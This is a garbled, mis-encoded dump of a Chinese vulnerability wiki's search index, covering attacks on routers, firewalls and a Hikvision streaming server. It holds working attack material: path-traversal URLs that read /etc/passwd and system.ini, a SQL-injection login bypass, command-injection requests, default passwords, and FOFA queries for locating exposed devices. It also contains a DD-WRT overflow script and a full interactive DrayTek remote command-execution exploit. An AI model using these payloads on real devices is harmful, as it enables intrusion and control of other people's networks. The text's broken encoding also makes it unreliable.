æ­å·æµ·åº·å¨è§†ç³»ç»ŸæŠ€æœ¯æœ‰é™å…¬å¸æµåª’ä½“ç®¡ç†æœåŠ¡å™¨å­˜åœ¨å¼±å£ä»¤æ¼æ´ï¼Œæ”»å‡»è€…å¯åˆ©ç”¨è¯¥æ¼æ´ç™»å½•åå°é€šè¿‡æ–‡ä»¶éå†æ¼æ´è·å–æ•æ„Ÿä¿¡æ¯ æ¼æ´å½±å“ [!NOTE] HIKVISION æµåª’ä½“ç®¡ç†æœåŠ¡å™¨ FOFA [!NOTE] title=\"æµåª’ä½“ç®¡ç†æœåŠ¡å™¨\" æ¼æ´å¤ç° ç™»å½•é¡µé¢å¦‚ä¸‹ï¼Œ é»˜è®¤è´¦å·å¯†ç ä¸º admin/12345 POCå¦‚ä¸‹ï¼Œè®¿é—®å¦‚ä¸‹Urlä¸‹è½½ system.iniæ–‡ä»¶ http://xxx.xxx.xxx.xxx/systemLog/downFile.php?fileName=../../../../../../../../../../../../../../../windows/system.ini æˆåŠŸè¯»å– C:/windows/system.ini PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:44 "},"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/Sapido/":{"url":"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/Sapido/","title":"Sapido","keywords":"","body":"Sapido Sapidoå¤šæ¬¾è·¯ç”±å™¨å‘½ä»¤æ‰§è¡Œæ¼æ´ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-03-17 10:45:24 "},"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/Sapido/Sapidoå¤šæ¬¾è·¯ç”±å™¨å‘½ä»¤æ‰§è¡Œæ¼æ´.html":{"url":"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/Sapido/Sapidoå¤šæ¬¾è·¯ç”±å™¨å‘½ä»¤æ‰§è¡Œæ¼æ´.html","title":"Sapidoå¤šæ¬¾è·¯ç”±å™¨å‘½ä»¤æ‰§è¡Œæ¼æ´","keywords":"","body":"Sapidoå¤šæ¬¾è·¯ç”±å™¨å‘½ä»¤æ‰§è¡Œæ¼æ´ æ¼æ´æè¿° Sapidoå¤šæ¬¾è·¯ç”±å™¨åœ¨æœªæˆæƒçš„æƒ…å†µä¸‹ï¼Œå¯¼è‡´ä»»æ„è®¿é—®è€…å¯ä»¥ä»¥Rootæƒé™æ‰§è¡Œå‘½ä»¤ æ¼æ´å½±å“ [!NOTE] BR270n-v2.1.03 BRC76n-v2.1.03 GR297-v2.1.3 RB1732-v2.0.43 FOFA [!NOTE] app=\"Sapido-è·¯ç”±å™¨\" æ¼æ´å¤ç° å›ºä»¶ä¸­å­˜åœ¨ä¸€ä¸ªaspæ–‡ä»¶ä¸º syscmd.asp å­˜åœ¨å‘½ä»¤æ‰§è¡Œ è®¿é—®ç›®æ ‡: http://xxx.xxx.xxx.xxx/syscmd.asp http://xxx.xxx.xxx.xxx/syscmd.htm ç›´æ¥è¾“å…¥å°±å¯ä»¥å‘½ä»¤æ‰§è¡Œäº† PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:44 "},"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/iKuai/":{"url":"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/iKuai/","title":"iKuai","keywords":"","body":"iKuai iKuai æµæ§è·¯ç”± SQLæ³¨å…¥æ¼æ´ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-31 18:00:36 "},"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/iKuai/iKuai æµæ§è·¯ç”± SQLæ³¨å…¥æ¼æ´.html":{"url":"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/iKuai/iKuai æµæ§è·¯ç”± SQLæ³¨å…¥æ¼æ´.html","title":"iKuai æµæ§è·¯ç”± SQLæ³¨å…¥æ¼æ´","keywords":"","body":"iKuai æµæ§è·¯ç”± SQLæ³¨å…¥æ¼æ´ æ¼æ´æè¿° iKuai æµæ§è·¯ç”± å­˜åœ¨SQLæ³¨å…¥æ¼æ´ï¼Œå¯ä»¥é€šè¿‡SQLæ³¨å…¥æ¼æ´æ„é€ ä¸‡èƒ½å¯†ç è·å–è·¯ç”±å™¨åå°ç®¡ç†æƒé™ æ¼æ´å½±å“ [!NOTE] iKuai æµæ§è·¯ç”± FOFA [!NOTE] title=\"ç™»å½•çˆ±å¿«æµæ§è·¯ç”±\" æ¼æ´å¤ç° ç™»å½•é¡µé¢å¦‚ä¸‹ ä½¿ç”¨ä¸‡èƒ½å¯†ç ç™»å½•åå° user: \"or\"\"=\"\"or\"\"=\" pass: ç©º PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-31 19:02:46 "},"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/ZeroShell/":{"url":"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/ZeroShell/","title":"ZeroShell","keywords":"","body":"ZeroShell ZeroShell 3.9.0 è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ CVE-2019-12725 PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-14 20:49:17 "},"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/ZeroShell/ZeroShell 3.9.0 è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ CVE-2019-12725.html":{"url":"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/ZeroShell/ZeroShell 3.9.0 è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ CVE-2019-12725.html","title":"ZeroShell 3.9.0 è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ CVE-2019-12725","keywords":"","body":"ZeroShell 3.9.0 è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ CVE-2019-12725 æ¼æ´æè¿° ZeroShell 3.9.0 å­˜åœ¨å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼Œ/cgi-bin/kerbynet é¡µé¢ï¼Œx509type å‚æ•°è¿‡æ»¤ä¸ä¸¥æ ¼ï¼Œå¯¼è‡´æ”»å‡»è€…å¯æ‰§è¡Œä»»æ„å‘½ä»¤ æ¼æ´å½±å“ [!NOTE] ZeroShell FOFA [!NOTE] app=\"Zeroshell-é˜²ç«å¢™\" æ¼æ´å¤ç° ç™»å½•é¡µé¢å¦‚ä¸‹ éªŒè¯çš„POCä¸º /cgi-bin/kerbynet?Action=x509view&Section=NoAuthREQ&User=&x509type=%27%0Aid%0A%27 PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:44 "},"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/JCG/":{"url":"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/JCG/","title":"JCG","keywords":"","body":"JCG JCG JHR-N835R åå°å‘½ä»¤æ‰§è¡Œæ¼æ´ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-03-17 17:13:09 "},"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/JCG/JCG JHR-N835R åå°å‘½ä»¤æ‰§è¡Œæ¼æ´.html":{"url":"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/JCG/JCG JHR-N835R åå°å‘½ä»¤æ‰§è¡Œæ¼æ´.html","title":"JCG JHR-N835R åå°å‘½ä»¤æ‰§è¡Œæ¼æ´","keywords":"","body":"JCG JHR-N835R åå°å‘½ä»¤æ‰§è¡Œæ¼æ´ æ¼æ´æè¿° JCG JHR-N835R åå°å­˜åœ¨å‘½ä»¤æ‰§è¡Œï¼Œé€šè¿‡ ; åˆ†å‰² ping å‘½ä»¤å¯¼è‡´ä»»æ„å‘½ä»¤æ‰§è¡Œ æ¼æ´å½±å“ [!NOTE] JCG JHR-N835R Shodan [!NOTE] JHR-N835R æ¼æ´å¤ç° ç™»å½•é¡µé¢ admin adminç™»å½• åœ¨åå°ç³»ç»Ÿå·¥å…·é‚£ä½¿ç”¨ PINGå·¥å…·ï¼Œä½¿ç”¨ ; å‘½ä»¤æ‰§è¡Œç»•è¿‡ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:44 "},"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/DD-WRT/":{"url":"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/DD-WRT/","title":"DD-WRT","keywords":"","body":"DD-WRT DD-WRT UPNPç¼“å†²åŒºæº¢å‡ºæ¼æ´ CVE-2021-27137 PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-03-31 09:13:48 "},"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/DD-WRT/DD-WRT UPNPç¼“å†²åŒºæº¢å‡ºæ¼æ´ CVE-2021-27137.html":{"url":"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/DD-WRT/DD-WRT UPNPç¼“å†²åŒºæº¢å‡ºæ¼æ´ CVE-2021-27137.html","title":"DD-WRT UPNPç¼“å†²åŒºæº¢å‡ºæ¼æ´ CVE-2021-27137","keywords":"","body":"DD-WRT UPNPç¼“å†²åŒºæº¢å‡ºæ¼æ´ CVE-2021-27137 æ¼æ´æè¿° é»˜è®¤æƒ…å†µä¸‹ï¼ŒDD-WRTä¸­çš„UPNPå¤„äºç¦ç”¨çŠ¶æ€ï¼Œå¹¶ä¸”ä»…åœ¨å†…éƒ¨ç½‘ç»œæ¥å£ä¸Šä¾¦å¬ã€‚ UPNPæœ¬è´¨ä¸Šæ˜¯æœªç»èº«ä»½éªŒè¯çš„UDPå½¢å¼çš„åè®®â€“ç”±äºæ— æ³•å¯¹åè®®å¼ºåˆ¶æ‰§è¡Œèº«ä»½éªŒè¯ï¼Œå› æ­¤å®ƒæ—¢æ˜“äºä½¿ç”¨åˆå…·æœ‰ä¸å®‰å…¨æ€§ã€‚ å¦‚æœDD-WRTå¯ç”¨äº†UPNPæœåŠ¡ï¼Œåˆ™ååœ¨å­˜åœ¨DD-WRTè®¾å¤‡çš„LANä¸Šçš„è¿œç¨‹æ”»å‡»è€…å¯ä»¥é€šè¿‡å‘é€ä¸€ä¸ªè¿‡é•¿çš„uuidå€¼æ¥è§¦å‘ç¼“å†²åŒºæº¢å‡ºã€‚ æ ¹æ®éƒ¨ç½²DD-WRTçš„å¹³å°çš„ä¸åŒï¼Œå¯èƒ½å­˜åœ¨ç¼“è§£æªæ–½ï¼Œä¹Ÿå¯èƒ½æ²¡æœ‰ç¼“è§£æªæ–½ï¼Œä¾‹å¦‚ASLRç­‰ï¼Œè¿™ä½¿å¾—å¯åˆ©ç”¨æ€§å–å†³äºå®‰è£…DD-WRTçš„å¹³å°ã€‚ æ¼æ´å½±å“ [!NOTE] DD-WRT æ¼æ´å¤ç° é€šè¿‡æŸ¥çœ‹æºä»£ç ï¼Œssdp.cå¯ä»¥å¾ˆå®¹æ˜“åœ°å‘ç°æœ‰é—®é¢˜çš„ä»£ç ï¼š ç”¨æˆ·æä¾›çš„æ•°æ®çš„æœªç»‘å®šå‰¯æœ¬è¢«å¤åˆ¶åˆ°ç¼“å†²åŒºä¸­ï¼Œè¯¥ç¼“å†²åŒºçš„å¤§å°é™åˆ¶ä¸º128ä¸ªå­—èŠ‚ã€‚ ç”±äºé»˜è®¤æƒ…å†µä¸‹æœªå¯ç”¨UPNPæœåŠ¡ï¼Œå› æ­¤é‡æ–°åˆ›å»ºæ¼æ´çš„ç¬¬ä¸€æ­¥æ˜¯å¯ç”¨å°†è‡ªåŠ¨å¯åŠ¨è¯¥æœåŠ¡çš„æœåŠ¡ å¯åŠ¨PoCè„šæœ¬å°†è§¦å‘upnpæœåŠ¡å´©æºƒï¼Œè¿™å¯ä»¥åœ¨å¯åŠ¨ä»¥ä¸‹pythonè„šæœ¬å‡ ç§’é’Ÿåçœ‹åˆ° æ¼æ´åˆ©ç”¨POC import socket target_ip = \"192.168.15.124\" # IP Address of Target off = \"D\"*164 ret_addr = \"AAAA\" payload = off + ret_addr packet = \\ 'M-SEARCH * HTTP/1.1\\r\\n' \\ 'HOST:239.255.255.250:1900\\r\\n' \\ 'ST:uuid:'+payload+'\\r\\n' \\ 'MX:2\\r\\n' \\ 'MAN:\"ssdp:discover\"\\r\\n' \\ '\\r\\n' s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP) s.sendto(packet.encode(), (target_ip, 1900) ) PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:44 "},"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/MagicFlow/":{"url":"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/MagicFlow/","title":"MagicFlow","keywords":"","body":"PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-06-09 18:10:50 "},"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/MagicFlow/MagicFlow é˜²ç«å¢™ç½‘å…³ main.xp ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´.html":{"url":"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/MagicFlow/MagicFlow é˜²ç«å¢™ç½‘å…³ main.xp ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´.html","title":"MagicFlow é˜²ç«å¢™ç½‘å…³ main.xp ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´","keywords":"","body":"MagicFlow é˜²ç«å¢™ç½‘å…³ main.xp ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ æ¼æ´æè¿° MagicFlow é˜²ç«å¢™ç½‘å…³ main.xp å­˜åœ¨ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ï¼Œæ”»å‡»è€…é€šè¿‡æ„é€ ç‰¹å®šçš„Urlè·å–æ•æ„Ÿæ–‡ä»¶ æ¼æ´å½±å“ [!NOTE] MagicFlow é˜²ç«å¢™ç½‘å…³ FOFA [!NOTE] app=\"MSA/1.0\" æ¼æ´å¤ç° ç™»å½•é¡µé¢å¦‚ä¸‹ æ„é€ POC /msa/main.xp?Fun=msaDataCenetrDownLoadMore+delflag=1+downLoadFileName=msagroup.txt+downLoadFile=../etc/passwd PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-06-09 18:32:14 "},"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/WayOS/":{"url":"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/WayOS/","title":"WayOS","keywords":"","body":"Wayos Wayos ACé›†ä¸­ç®¡ç†ç³»ç»Ÿé»˜è®¤å¼±å£ä»¤ CNVD-2021-00876 PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-02-07 22:34:16 "},"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/WayOS/Wayos ACé›†ä¸­ç®¡ç†ç³»ç»Ÿé»˜è®¤å¼±å£ä»¤ CNVD-2021-00876.html":{"url":"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/WayOS/Wayos ACé›†ä¸­ç®¡ç†ç³»ç»Ÿé»˜è®¤å¼±å£ä»¤ CNVD-2021-00876.html","title":"Wayos ACé›†ä¸­ç®¡ç†ç³»ç»Ÿé»˜è®¤å¼±å£ä»¤ CNVD-2021-00876","keywords":"","body":"Wayos ACé›†ä¸­ç®¡ç†ç³»ç»Ÿé»˜è®¤å¼±å£ä»¤ CNVD-2021-00876 æ¼æ´æè¿° æ·±åœ³ç»´ç›Ÿç§‘æŠ€è‚¡ä»½æœ‰é™å…¬å¸æ˜¯å›½å†…é¢†å…ˆçš„ç½‘ç»œè®¾å¤‡åŠæ™ºèƒ½å®¶å±…äº§å“è§£å†³æ–¹æ¡ˆä¾›åº”å•†ï¼Œä¸»è¥äº§å“åŒ…æ‹¬æ— çº¿ç½‘å…³ã€äº¤æ¢æœºã€å›½å¤–VPNã€åŒé¢‘å¸é¡¶apç­‰ã€‚ ACé›†ä¸­ç®¡ç†å¹³å°å­˜åœ¨å¼±å£ä»¤æ¼æ´ï¼Œæ”»å‡»è€…å¯åˆ©ç”¨è¯¥æ¼æ´è·å–æ•æ„Ÿä¿¡æ¯ã€‚ æ¼æ´å½±å“ [!NOTE] ACé›†ä¸­ç®¡ç†ç³»ç»Ÿ FOFA [!NOTE] title=\"ACé›†ä¸­ç®¡ç†ç³»ç»Ÿ\" æ¼æ´å¤ç° é»˜è®¤å¼±å£ä»¤ä¸º admin:admin Goby & POC [!NOTE] å·²ä¸Šä¼  https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC ç›®å½•ä¸­ Wayos_AC_Centralized_management_system_Default_weak_password PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:44 "},"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/WayOS/Wayos é˜²ç«å¢™ è´¦å·å¯†ç æ³„éœ²æ¼æ´.html":{"url":"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/WayOS/Wayos é˜²ç«å¢™ è´¦å·å¯†ç æ³„éœ²æ¼æ´.html","title":"Wayos é˜²ç«å¢™ è´¦å·å¯†ç æ³„éœ²æ¼æ´","keywords":"","body":"Wayos é˜²ç«å¢™ è´¦å·å¯†ç æ³„éœ²æ¼æ´ æ¼æ´æè¿° Wayos é˜²ç«å¢™å­˜åœ¨è´¦å·å¯†ç æ³„éœ²æ¼æ´ï¼Œæ”»å‡»è€…é€šè¿‡å‰ç«¯å¯ä»¥æŸ¥çœ‹åˆ°å¯†ç çš„md5çš„åŠ å¯†å­—ç¬¦ï¼Œè§£å¯†åå¯ä»¥ç™»é™†åå° æ¼æ´å½±å“ [!NOTE] Wayos é˜²ç«å¢™ FOFA [!NOTE] body=\"Get_Verify_Info(hex_md5(user_string).\" æ¼æ´å¤ç° ç™»å½•é¡µé¢å¦‚ä¸‹ F12 æŸ¥çœ‹è´¦å·å¯†ç  è§£å¯†Md5å³å¯ç™»å½•åå° PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-31 23:06:36 "},"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/WayOS/Wayos é˜²ç«å¢™ åå°å‘½ä»¤æ‰§è¡Œæ¼æ´.html":{"url":"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/WayOS/Wayos é˜²ç«å¢™ åå°å‘½ä»¤æ‰§è¡Œæ¼æ´.html","title":"Wayos é˜²ç«å¢™ åå°å‘½ä»¤æ‰§è¡Œæ¼æ´","keywords":"","body":"Wayos é˜²ç«å¢™ åå°å‘½ä»¤æ‰§è¡Œæ¼æ´ æ¼æ´æè¿° Wayos é˜²ç«å¢™ åå°å­˜åœ¨å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼Œé€šè¿‡å‘½ä»¤æ³¨å…¥å¯ä»¥æ‰§è¡Œè¿œç¨‹å‘½ä»¤ æ¼æ´å½±å“ [!NOTE] Wayos é˜²ç«å¢™ FOFA [!NOTE] body=\"Get_Verify_Info(hex_md5(user_string).\" æ¼æ´å¤ç° ç™»å½•é¡µé¢å¦‚ä¸‹ ç™»å½•åå°å ping æ¨¡å—å‘½ä»¤æ‰§è¡Œ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-31 22:49:18 "},"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/DrayTek/":{"url":"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/DrayTek/","title":"DrayTek","keywords":"","body":"DrayTek DrayTekä¼ä¸šç½‘ç»œè®¾å¤‡ è¿œç¨‹å‘½ä»¤æ‰§è¡Œ CVE-2020-8515 PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-02-20 11:04:39 "},"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/DrayTek/DrayTekä¼ä¸šç½‘ç»œè®¾å¤‡ è¿œç¨‹å‘½ä»¤æ‰§è¡Œ CVE-2020-8515.html":{"url":"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/DrayTek/DrayTekä¼ä¸šç½‘ç»œè®¾å¤‡ è¿œç¨‹å‘½ä»¤æ‰§è¡Œ CVE-2020-8515.html","title":"DrayTekä¼ä¸šç½‘ç»œè®¾å¤‡ è¿œç¨‹å‘½ä»¤æ‰§è¡Œ CVE-2020-8515","keywords":"","body":"DrayTekä¼ä¸šç½‘ç»œè®¾å¤‡ è¿œç¨‹å‘½ä»¤æ‰§è¡Œ CVE-2020-8515 æ¼æ´æè¿° DrayTek URIæœªèƒ½æ­£ç¡®å¤„ç†SHELLå­—ç¬¦ï¼Œè¿œç¨‹æ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¯¥æ¼æ´æäº¤ç‰¹æ®Šçš„è¯·æ±‚ï¼Œå¯ä»¥ROOTæƒé™æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚ è¿œç¨‹å‘½ä»¤æ³¨å…¥æ¼æ´è¢«æ ‡è®°ä¸ºCVE-2020-8515ï¼Œä¸»è¦å½±å“äº†DrayTek Vigorç½‘ç»œè®¾å¤‡ï¼ŒåŒ…æ‹¬ä¼ä¸šäº¤æ¢æœºã€è·¯ç”±å™¨ã€è´Ÿè½½å‡è¡¡å™¨å’ŒVPNç½‘å…³ã€‚ æ¼æ´å½±å“ [!NOTE] Vigor2960 Vigor300B Vigor3900 VigorSwitch20P2121 VigorSwitch20G1280 VigorSwitch20P1280 VigorSwitch20G2280 VigorSwitch20P2280 FOFA [!NOTE] title=\"Vigor 2960\" æ¼æ´å¤ç° ç™»å½•é¡µé¢æŠ“åŒ… è¯·æ±‚åŒ…å¦‚ä¸‹ POST /cgi-bin/mainfunction.cgi HTTP/1.1 Host: xxx.xxx.xxx.xxx Connection: close Content-Length: 67 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36 Content-Type: text/plain; charset=UTF-8 Accept: */* Sec-Fetch-Site: same-origin Sec-Fetch-Mode: cors Sec-Fetch-Dest: empty Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 action=login&keyPath=%27%0A%2fbin%2fls%0A%27&loginUser=a&loginPwd=a å…¶ä¸­å‡ºç°æ³¨å…¥ç‚¹çš„å‚æ•°ä¸º keyPath [!NOTE] å‡ºç°ç©ºæ ¼éœ€è¦æ›¿æ¢ï¼Œä¾‹å¦‚ cat /etc/passwd --> cat${IFS}/etc/passwd å¯ä»¥ä½¿ç”¨ & æ‰§è¡Œé¢å¤–ä¸€æ¡å‘½ä»¤ (URLç¼–ç ä¸º %26) æ¼æ´åˆ©ç”¨POC import requests import sys import random import re from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34må…¬ä¼—å· : PeiQiæ–‡åº“ \\033[0m') print('+ \\033[34mVersion: DrayTekä¼ä¸šç½‘ç»œè®¾å¤‡ \\033[0m') print('+ \\033[36mä½¿ç”¨æ ¼å¼: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+ \\033[36mCmd >>> pwd \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/cgi-bin/mainfunction.cgi\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", } data = \"action=login&keyPath=%27%0A%2fbin%2fcat${IFS}/etc/passwd%0A%27&loginUser=a&loginPwd=a\" try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, headers=headers, data=data, verify=False, timeout=5) print(\"\\033[32m[o] æ­£åœ¨è¯·æ±‚ {}/cgi-bin/mainfunction.cgi \\033[0m\".format(target_url)) if \"root\" in response.text and response.status_code == 200: print(\"\\033[32m[o] ç›®æ ‡ {}å­˜åœ¨æ¼æ´ ,æˆåŠŸè¯»å– /etc/passwd \\033[0m\".format(target_url)) print(\"\\033[32m[o] å“åº”ä¸º:\\n{} \\033[0m\".format(response.text)) while True: Cmd = input(\"\\033[35mCmd >>> \\033[0m\") if Cmd == \"exit\": sys.exit(0) else: POC_2(target_url, Cmd) else: print(\"\\033[31m[x] ä¸å­˜åœ¨æ¼æ´ \\033[0m\") sys.exit(0) except Exception as e: print(\"\\033[31m[x] è¯·æ±‚å¤±è´¥ \\033[0m\", e) sys.exit(0) def POC_2(target_url, Cmd): vuln_url = target_url + \"/cgi-bin/mainfunction.cgi\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", } Cmd = Cmd.replace(' ','${IFS}') data = \"action=login&keyPath=%27%0A%2fbin%2f%26{}%0A%27&loginUser=a&loginPwd=a\".format(Cmd) try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, headers=headers, data=data, verify=False, timeout=5) if response.status_code == 200: print(\"\\033[32m[o] æ­£åœ¨è¯·æ±‚ {}/cgi-bin/mainfunction.cgi \\033[0m\".format(target_url)) print(\"\\033[32m[o] å“åº”ä¸º:\\n{} \\033[0m\".format(response.text)) except Exception as e: print(\"\\033[31m[x] è¯·æ±‚å¤±è´¥ \\033[0m\", e) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url) Goby & POC [!NOTE] Gobyä¸­å·²ç»åŒ…å«æ­¤æ¼æ´ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:44 "},"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/Intelbras/":{"url":"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/Intelbras/","title":"Intelbras","keywords":"","body":"Intelbras Intelbras Wireless æœªæˆæƒä¸å¯†ç æ³„éœ² CVE-2021-3017 PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-03 17:23:47 "},"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/Intelbras/Intelbras Wireless æœªæˆæƒä¸å¯†ç æ³„éœ² CVE-2021-3017.html":{"url":"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/Intelbras/Intelbras Wireless æœªæˆæƒä¸å¯†ç æ³„éœ² CVE-2021-3017.html","title":"Intelbras Wireless æœªæˆæƒä¸å¯†ç æ³„éœ² CVE-2021-3017","keywords":"","body":"Intelbras Wireless æœªæˆæƒä¸å¯†ç æ³„éœ² CVE-2021-3017 æ¼æ´æè¿° Intelbras IWR 3000Næ˜¯æ³¢å…°Intelbraså…¬å¸çš„ä¸€æ¬¾æ— çº¿è·¯ç”±å™¨ã€‚ Intelbras WIN 300 and WRN 342 devices 2021-01-04ç‰ˆæœ¬åŠä¹‹å‰ç‰ˆæœ¬å­˜åœ¨å®‰å…¨æ¼æ´ï¼Œè¯¥æ¼æ´å…è®¸è¿œç¨‹æ”»å‡»è€…é€šè¿‡è¯»å–HTMLæºä»£ç ä¸­çš„def wireless spasswordè¡Œæ¥å‘ç°å‡­æ®ã€‚ æ¼æ´å½±å“ [!NOTE] win_300_firmware ç­‰ FOFA [!NOTE] body=\"def_wirelesspassword\" æ¼æ´å¤ç° ç™»å½•é¡µé¢å¦‚ä¸‹ æŸ¥çœ‹ç½‘é¡µæºä»£ç ï¼Œæ³„éœ²äº†é…ç½®å¯†ç  æµ‹è¯•äº†ä¸€ä¸‹å…¶ä»–çš„ï¼Œå‘ç°å‡ºç°è´¦å·å¯†ç çš„åŸå› 